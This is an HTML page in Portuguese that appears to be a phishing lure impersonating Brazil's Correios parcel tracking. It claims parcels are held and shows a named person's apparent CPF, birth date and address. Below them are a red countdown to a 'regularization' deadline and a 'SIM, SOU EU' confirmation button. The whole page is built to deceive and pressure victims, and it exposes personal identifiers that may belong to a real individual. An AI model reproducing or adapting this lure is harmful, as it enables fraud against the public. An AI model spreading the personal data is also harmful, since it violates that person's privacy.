<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Correios | Rastreio</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f8f9fa;
      color: #003157;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }

    #resultado {
      background: #fff;
      padding: 20px 25px;
      margin: 30px auto;
      border-radius: 8px;
      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
      max-width: 420px;
      width: 100%;
      font-size: 14px; /* fonte menor igual da primeira p√°gina */
      font-weight: 400;
      color: #003157;
      text-align: center; /* centraliza tudo */
    }

    #resultado h2 {
      font-size: 16px;
      font-weight: 700;
      margin-bottom: 16px;
      color: #003157;
    }

    #resultado p {
      margin: 6px 0;
      line-height: 1.3;
    }

    #resultado p span.label {
      font-weight: 700;
      margin-right: 6px;
      color: #003157;
    }

    /* Rua e Bairro em branco com fundo azul escuro */
    #res-rua,
    #res-bairro {
      color: white !important;
      background-color: #003157;
      padding: 2px 6px;
      border-radius: 4px;
      display: inline-block;
      margin-left: 4px;
    }

    /* Prazo em vermelho e centralizado */
    #prazo-container {
      margin-top: 18px;
      font-weight: 700;
      font-size: 14px;
      color: red;
    }

    #countdown {
      font-weight: 400;
      margin-top: 6px;
      font-size: 13px;
      color: red;
    }

    /* Bot√£o azul */
    #btn-sim-sou-eu {
      margin-top: 20px;
      background-color: #007bff;
      border: none;
      color: white;
      padding: 10px 25px;
      font-size: 14px;
      font-weight: 700;
      border-radius: 6px;
      cursor: pointer;
      width: 100%;
      max-width: 240px;
      margin-left: auto;
      margin-right: auto;
      display: block;
      transition: background-color 0.3s ease;
    }

    #btn-sim-sou-eu:hover {
      background-color: #0056b3;
    }
  </style>
</head>

<body>
  <section id="resultado">
    <h2>Encontramos pedidos retidos em uma de nossas ag√™ncias. üì¶</h2>
    <p><span class="label">Nome:</span> Rosiane Oliveira Da Silva</p>
    <p><span class="label">CPF:</span> 118.273.047-74</p>
    <p><span class="label">Nascimento:</span> 27/01/1985</p>
    <p><span class="label">CEP:</span> 28390-000</p>
    <p><span class="label">Rua:</span> <span id="res-rua">Rua das Ac√°cias</span></p>
    <p><span class="label">Bairro:</span> <span id="res-bairro">Centro</span></p>
    <p><span class="label">Cidade:</span> Porci√∫ncula</p>
    <p><span class="label">Estado:</span> RJ</p>

    <div id="prazo-container">
      Prazo para Regulariza√ß√£o: 26/06/2025 √†s 23:59
      <div id="countdown"></div>
    </div>

    <button id="btn-sim-sou-eu" type="button">SIM, SOU EU</button>
  </section>

  <script>
    // Contagem regressiva para 26/06/2025 √†s 23:59
    const prazo = new Date('2025-06-26T23:59:00').getTime();

    function atualizarContagem() {
      const agora = new Date().getTime();
      const distancia = prazo - agora;

      if (distancia < 0) {
        document.getElementById('countdown').textContent = 'Prazo expirado!';
        clearInterval(interval);
        return;
      }

      const dias = Math.floor(distancia / (1000 * 60 * 60 * 24));
      const horas = Math.floor((distancia % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutos = Math.floor((distancia % (1000 * 60 * 60)) / (1000 * 60));
      const segundos = Math.floor((distancia % (1000 * 60)) / 1000);

      document.getElementById('countdown').textContent = `Tempo restante: ${dias}d ${horas}h ${minutos}m ${segundos}s`;
    }

    const interval = setInterval(atualizarContagem, 1000);
    atualizarContagem();
  </script>
</body>

</html>
